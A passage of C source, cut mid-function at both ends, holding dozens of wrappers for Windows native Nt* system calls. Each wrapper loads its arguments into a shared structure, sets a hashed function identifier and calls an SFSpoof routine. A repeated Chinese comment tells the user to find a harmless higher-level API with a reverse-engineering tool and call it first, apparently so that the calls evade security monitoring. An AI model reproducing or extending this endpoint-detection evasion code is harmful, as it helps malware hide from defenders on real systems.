    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 1;
    Params.FuncHash = 0x009966744;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtManagePartition(HANDLE TargetHandle, HANDLE SourceHandle, MEMORY_PARTITION_INFORMATION_CLASS PartitionInformationClass, PVOID PartitionInformation, ULONG PartitionInformationLength) {
    Params.param[1] = (DWORD_PTR)TargetHandle;
    Params.param[2] = (DWORD_PTR)SourceHandle;
    Params.param[3] = (DWORD_PTR)PartitionInformationClass;
    Params.param[4] = (DWORD_PTR)PartitionInformation;
    Params.param[5] = (DWORD_PTR)PartitionInformationLength;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 5;
    Params.FuncHash = 0x000AA4005;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtMapCMFModule(ULONG What, ULONG Index, PULONG CacheIndexOut, PULONG CacheFlagsOut, PULONG ViewSizeOut, PVOID BaseAddress) {
    Params.param[1] = (DWORD_PTR)What;
    Params.param[2] = (DWORD_PTR)Index;
    Params.param[3] = (DWORD_PTR)CacheIndexOut;
    Params.param[4] = (DWORD_PTR)CacheFlagsOut;
    Params.param[5] = (DWORD_PTR)ViewSizeOut;
    Params.param[6] = (DWORD_PTR)BaseAddress;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 6;
    Params.FuncHash = 0x056D86A5E;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtMapUserPhysicalPages(PVOID VirtualAddress, PULONG NumberOfPages, PULONG UserPfnArray) {
    Params.param[1] = (DWORD_PTR)VirtualAddress;
    Params.param[2] = (DWORD_PTR)NumberOfPages;
    Params.param[3] = (DWORD_PTR)UserPfnArray;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 3;
    Params.FuncHash = 0x07926824E;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtMapViewOfSectionEx(HANDLE SectionHandle, HANDLE ProcessHandle, PLARGE_INTEGER SectionOffset, PPVOID BaseAddress, PSIZE_T ViewSize, ULONG AllocationType, ULONG Protect, PVOID DataBuffer, ULONG DataCount) {
    Params.param[1] = (DWORD_PTR)SectionHandle;
    Params.param[2] = (DWORD_PTR)ProcessHandle;
    Params.param[3] = (DWORD_PTR)SectionOffset;
    Params.param[4] = (DWORD_PTR)BaseAddress;
    Params.param[5] = (DWORD_PTR)ViewSize;
    Params.param[6] = (DWORD_PTR)AllocationType;
    Params.param[7] = (DWORD_PTR)Protect;
    Params.param[8] = (DWORD_PTR)DataBuffer;
    Params.param[9] = (DWORD_PTR)DataCount;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 9;
    Params.FuncHash = 0x084D606EC;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtModifyBootEntry(PBOOT_ENTRY BootEntry) {
    Params.param[1] = (DWORD_PTR)BootEntry;
    Params.param[2] = 0;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 1;
    Params.FuncHash = 0x00D81090E;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtModifyDriverEntry(PEFI_DRIVER_ENTRY DriverEntry) {
    Params.param[1] = (DWORD_PTR)DriverEntry;
    Params.param[2] = 0;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 1;
    Params.FuncHash = 0x00191312E;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtNotifyChangeDirectoryFile(HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTINE ApcRoutine, PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, PFILE_NOTIFY_INFORMATION Buffer, ULONG Length, ULONG CompletionFilter, BOOLEAN WatchTree) {
    Params.param[1] = (DWORD_PTR)FileHandle;
    Params.param[2] = (DWORD_PTR)Event;
    Params.param[3] = (DWORD_PTR)ApcRoutine;
    Params.param[4] = (DWORD_PTR)ApcContext;
    Params.param[5] = (DWORD_PTR)IoStatusBlock;
    Params.param[6] = (DWORD_PTR)Buffer;
    Params.param[7] = (DWORD_PTR)Length;
    Params.param[8] = (DWORD_PTR)CompletionFilter;
    Params.param[9] = (DWORD_PTR)WatchTree;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 9;
    Params.FuncHash = 0x06CFA7E4E;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtNotifyChangeDirectoryFileEx(HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTINE ApcRoutine, PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, PVOID Buffer, ULONG Length, ULONG CompletionFilter, BOOLEAN WatchTree, DIRECTORY_NOTIFY_INFORMATION_CLASS DirectoryNotifyInformationClass) {
    Params.param[1] = (DWORD_PTR)FileHandle;
    Params.param[2] = (DWORD_PTR)Event;
    Params.param[3] = (DWORD_PTR)ApcRoutine;
    Params.param[4] = (DWORD_PTR)ApcContext;
    Params.param[5] = (DWORD_PTR)IoStatusBlock;
    Params.param[6] = (DWORD_PTR)Buffer;
    Params.param[7] = (DWORD_PTR)Length;
    Params.param[8] = (DWORD_PTR)CompletionFilter;
    Params.param[9] = (DWORD_PTR)WatchTree;
    Params.param[10] = (DWORD_PTR)DirectoryNotifyInformationClass;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 10;
    Params.FuncHash = 0x006B5C0EB;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtNotifyChangeKey(HANDLE KeyHandle, HANDLE Event, PIO_APC_ROUTINE ApcRoutine, PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, ULONG CompletionFilter, BOOLEAN WatchTree, PVOID Buffer, ULONG BufferSize, BOOLEAN Asynchronous) {
    Params.param[1] = (DWORD_PTR)KeyHandle;
    Params.param[2] = (DWORD_PTR)Event;
    Params.param[3] = (DWORD_PTR)ApcRoutine;
    Params.param[4] = (DWORD_PTR)ApcContext;
    Params.param[5] = (DWORD_PTR)IoStatusBlock;
    Params.param[6] = (DWORD_PTR)CompletionFilter;
    Params.param[7] = (DWORD_PTR)WatchTree;
    Params.param[8] = (DWORD_PTR)Buffer;
    Params.param[9] = (DWORD_PTR)BufferSize;
    Params.param[10] = (DWORD_PTR)Asynchronous;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 10;
    Params.FuncHash = 0x08505FAC0;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtNotifyChangeMultipleKeys(HANDLE MasterKeyHandle, ULONG Count, POBJECT_ATTRIBUTES SubordinateObjects, HANDLE Event, PIO_APC_ROUTINE ApcRoutine, PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, ULONG CompletionFilter, BOOLEAN WatchTree, PVOID Buffer, ULONG BufferSize, BOOLEAN Asynchronous) {
    Params.param[1] = (DWORD_PTR)MasterKeyHandle;
    Params.param[2] = (DWORD_PTR)Count;
    Params.param[3] = (DWORD_PTR)SubordinateObjects;
    Params.param[4] = (DWORD_PTR)Event;
    Params.param[5] = (DWORD_PTR)ApcRoutine;
    Params.param[6] = (DWORD_PTR)ApcContext;
    Params.param[7] = (DWORD_PTR)IoStatusBlock;
    Params.param[8] = (DWORD_PTR)CompletionFilter;
    Params.param[9] = (DWORD_PTR)WatchTree;
    Params.param[10] = (DWORD_PTR)Buffer;
    Params.param[11] = (DWORD_PTR)BufferSize;
    Params.param[12] = (DWORD_PTR)Asynchronous;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 12;
    Params.FuncHash = 0x0EBB8F413;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtNotifyChangeSession(HANDLE SessionHandle, ULONG ChangeSequenceNumber, PLARGE_INTEGER ChangeTimeStamp, IO_SESSION_EVENT Event, IO_SESSION_STATE NewState, IO_SESSION_STATE PreviousState, PVOID Payload, ULONG PayloadSize) {
    Params.param[1] = (DWORD_PTR)SessionHandle;
    Params.param[2] = (DWORD_PTR)ChangeSequenceNumber;
    Params.param[3] = (DWORD_PTR)ChangeTimeStamp;
    Params.param[4] = (DWORD_PTR)Event;
    Params.param[5] = (DWORD_PTR)NewState;
    Params.param[6] = (DWORD_PTR)PreviousState;
    Params.param[7] = (DWORD_PTR)Payload;
    Params.param[8] = (DWORD_PTR)PayloadSize;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 8;
    Params.FuncHash = 0x07A991C09;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtOpenEnlistment(PHANDLE EnlistmentHandle, ACCESS_MASK DesiredAccess, HANDLE ResourceManagerHandle, LPGUID EnlistmentGuid, POBJECT_ATTRIBUTES ObjectAttributes) {
    Params.param[1] = (DWORD_PTR)EnlistmentHandle;
    Params.param[2] = (DWORD_PTR)DesiredAccess;
    Params.param[3] = (DWORD_PTR)ResourceManagerHandle;
    Params.param[4] = (DWORD_PTR)EnlistmentGuid;
    Params.param[5] = (DWORD_PTR)ObjectAttributes;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 5;
    Params.FuncHash = 0x0583F45BD;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtOpenEventPair(PHANDLE EventPairHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes) {
    Params.param[1] = (DWORD_PTR)EventPairHandle;
    Params.param[2] = (DWORD_PTR)DesiredAccess;
    Params.param[3] = (DWORD_PTR)ObjectAttributes;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 3;
    Params.FuncHash = 0x090B1C867;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtOpenIoCompletion(PHANDLE IoCompletionHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes) {
    Params.param[1] = (DWORD_PTR)IoCompletionHandle;
    Params.param[2] = (DWORD_PTR)DesiredAccess;
    Params.param[3] = (DWORD_PTR)ObjectAttributes;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 3;
    Params.FuncHash = 0x0DC55FAC5;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtOpenJobObject(PHANDLE JobHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes) {
    Params.param[1] = (DWORD_PTR)JobHandle;
    Params.param[2] = (DWORD_PTR)DesiredAccess;
    Params.param[3] = (DWORD_PTR)ObjectAttributes;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 3;
    Params.FuncHash = 0x0E6B8EC27;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtOpenKeyEx(PHANDLE KeyHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, ULONG OpenOptions) {
    Params.param[1] = (DWORD_PTR)KeyHandle;
    Params.param[2] = (DWORD_PTR)DesiredAccess;
    Params.param[3] = (DWORD_PTR)ObjectAttributes;
    Params.param[4] = (DWORD_PTR)OpenOptions;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 4;
    Params.FuncHash = 0x049DD9885;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtOpenKeyTransacted(PHANDLE KeyHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, HANDLE TransactionHandle) {
    Params.param[1] = (DWORD_PTR)KeyHandle;
    Params.param[2] = (DWORD_PTR)DesiredAccess;
    Params.param[3] = (DWORD_PTR)ObjectAttributes;
    Params.param[4] = (DWORD_PTR)TransactionHandle;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 4;
    Params.FuncHash = 0x0FEE0344E;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtOpenKeyTransactedEx(PHANDLE KeyHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, ULONG OpenOptions, HANDLE TransactionHandle) {
    Params.param[1] = (DWORD_PTR)KeyHandle;
    Params.param[2] = (DWORD_PTR)DesiredAccess;
    Params.param[3] = (DWORD_PTR)ObjectAttributes;
    Params.param[4] = (DWORD_PTR)OpenOptions;
    Params.param[5] = (DWORD_PTR)TransactionHandle;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 5;
    Params.FuncHash = 0x03EAF3C15;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtOpenKeyedEvent(PHANDLE KeyedEventHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes) {
    Params.param[1] = (DWORD_PTR)KeyedEventHandle;
    Params.param[2] = (DWORD_PTR)DesiredAccess;
    Params.param[3] = (DWORD_PTR)ObjectAttributes;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 3;
    Params.FuncHash = 0x010D5752C;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtOpenMutant(PHANDLE MutantHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes) {
    Params.param[1] = (DWORD_PTR)MutantHandle;
    Params.param[2] = (DWORD_PTR)DesiredAccess;
    Params.param[3] = (DWORD_PTR)ObjectAttributes;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 3;
    Params.FuncHash = 0x01CB5FEE3;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtOpenObjectAuditAlarm(PUNICODE_STRING SubsystemName, PVOID HandleId, PUNICODE_STRING ObjectTypeName, PUNICODE_STRING ObjectName, PSECURITY_DESCRIPTOR SecurityDescriptor, HANDLE ClientToken, ACCESS_MASK DesiredAccess, ACCESS_MASK GrantedAccess, PPRIVILEGE_SET Privileges, BOOLEAN ObjectCreation, BOOLEAN AccessGranted, PBOOLEAN GenerateOnClose) {
    Params.param[1] = (DWORD_PTR)SubsystemName;
    Params.param[2] = (DWORD_PTR)HandleId;
    Params.param[3] = (DWORD_PTR)ObjectTypeName;
    Params.param[4] = (DWORD_PTR)ObjectName;
    Params.param[5] = (DWORD_PTR)SecurityDescriptor;
    Params.param[6] = (DWORD_PTR)ClientToken;
    Params.param[7] = (DWORD_PTR)DesiredAccess;
    Params.param[8] = (DWORD_PTR)GrantedAccess;
    Params.param[9] = (DWORD_PTR)Privileges;
    Params.param[10] = (DWORD_PTR)ObjectCreation;
    Params.param[11] = (DWORD_PTR)AccessGranted;
    Params.param[12] = (DWORD_PTR)GenerateOnClose;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 12;
    Params.FuncHash = 0x05C97540A;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtOpenPartition(PHANDLE PartitionHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes) {
    Params.param[1] = (DWORD_PTR)PartitionHandle;
    Params.param[2] = (DWORD_PTR)DesiredAccess;
    Params.param[3] = (DWORD_PTR)ObjectAttributes;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 3;
    Params.FuncHash = 0x0CA9D28C1;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtOpenPrivateNamespace(PHANDLE NamespaceHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PVOID BoundaryDescriptor) {
    Params.param[1] = (DWORD_PTR)NamespaceHandle;
    Params.param[2] = (DWORD_PTR)DesiredAccess;
    Params.param[3] = (DWORD_PTR)ObjectAttributes;
    Params.param[4] = (DWORD_PTR)BoundaryDescriptor;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 4;
    Params.FuncHash = 0x02E963531;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtOpenProcessToken(HANDLE ProcessHandle, ACCESS_MASK DesiredAccess, PHANDLE TokenHandle) {
    Params.param[1] = (DWORD_PTR)ProcessHandle;
    Params.param[2] = (DWORD_PTR)DesiredAccess;
    Params.param[3] = (DWORD_PTR)TokenHandle;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 3;
    Params.FuncHash = 0x03DAF053E;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtOpenRegistryTransaction(PHANDLE RegistryHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes) {
    Params.param[1] = (DWORD_PTR)RegistryHandle;
    Params.param[2] = (DWORD_PTR)DesiredAccess;
    Params.param[3] = (DWORD_PTR)ObjectAttributes;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 3;
    Params.FuncHash = 0x01AB47865;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtOpenResourceManager(PHANDLE ResourceManagerHandle, ACCESS_MASK DesiredAccess, HANDLE TmHandle, LPGUID ResourceManagerGuid, POBJECT_ATTRIBUTES ObjectAttributes) {
    Params.param[1] = (DWORD_PTR)ResourceManagerHandle;
    Params.param[2] = (DWORD_PTR)DesiredAccess;
    Params.param[3] = (DWORD_PTR)TmHandle;
    Params.param[4] = (DWORD_PTR)ResourceManagerGuid;
    Params.param[5] = (DWORD_PTR)ObjectAttributes;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 5;
    Params.FuncHash = 0x067553C78;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtOpenSemaphore(PHANDLE SemaphoreHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes) {
    Params.param[1] = (DWORD_PTR)SemaphoreHandle;
    Params.param[2] = (DWORD_PTR)DesiredAccess;
    Params.param[3] = (DWORD_PTR)ObjectAttributes;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 3;
    Params.FuncHash = 0x056885068;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtOpenSession(PHANDLE SessionHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes) {
    Params.param[1] = (DWORD_PTR)SessionHandle;
    Params.param[2] = (DWORD_PTR)DesiredAccess;
    Params.param[3] = (DWORD_PTR)ObjectAttributes;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 3;
    Params.FuncHash = 0x0CA82CC16;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtOpenSymbolicLinkObject(PHANDLE LinkHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes) {
    Params.param[1] = (DWORD_PTR)LinkHandle;
    Params.param[2] = (DWORD_PTR)DesiredAccess;
    Params.param[3] = (DWORD_PTR)ObjectAttributes;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 3;
    Params.FuncHash = 0x006BCE0A1;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtOpenThread(PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientId) {
    Params.param[1] = (DWORD_PTR)ThreadHandle;
    Params.param[2] = (DWORD_PTR)DesiredAccess;
